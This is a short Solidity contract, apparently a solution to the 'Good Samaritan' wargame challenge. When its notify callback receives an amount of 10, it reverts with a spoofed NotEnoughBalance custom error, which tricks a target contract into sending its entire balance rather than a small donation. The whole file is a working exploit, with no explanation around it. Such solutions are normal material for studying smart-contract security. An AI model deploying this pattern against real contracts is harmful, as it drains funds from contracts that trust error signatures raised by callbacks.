// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
  function requestDonation() external returns (bool enoughBalance);
} 

contract AttackGoodSamaritan{
  error NotEnoughBalance();

  function exploit(address _addr) external{
    IGoodSamaritan(_addr).requestDonation();
  }

  function notify(uint256 amount) external pure {
        if (amount == 10) {
        revert NotEnoughBalance();
    } 
  }
}